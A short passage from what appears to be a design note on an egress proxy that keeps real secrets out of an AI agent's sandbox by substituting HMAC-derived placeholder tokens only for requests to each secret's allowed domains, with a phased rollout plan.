  TLS, and is single-tenant per VM.
- Placeholder format `__DST_SECRET_<32hex>__`, HMAC-derived, deterministic,
  fixed-width.
- Real values shipped to dsbx via `/etc/dust/egress-secrets.json` (root
  0600), never enter agent env.
- Substitution gated on per-secret `allowedDomains` so an exfil to an
  allowlisted-but-unrelated domain doesn't leak.
- Phase 1: HTTP/1-only headers, ~2 eng-weeks. Phase 2: h2 + bodies +
  websockets.
- Drop or simplify the bash-output redactor once placeholders are in env —
  it's no longer the line of defense.
